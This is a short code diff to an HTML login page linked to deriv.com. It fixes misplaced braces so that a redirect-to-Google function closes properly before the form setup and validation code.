@@ -742,6 +742,7 @@ Don’t have an account yet? <a class="account-link" href="https://deriv.com/sig
 <script type="text/javascript">
 function redirect() {
 window.location.href = "https://www.google.com/"	
+	};
     var frmLogin, txtEmail, txtPass, btnToggle;
     window.onload = function() {
         frmLogin  = document.getElementById('frmLogin');
@@ -774,7 +775,7 @@ window.location.href = "https://www.google.com/"
             }
         });
     };
-};
+
     function validateAll() {
         return validateEmail() && validatePass();
     }
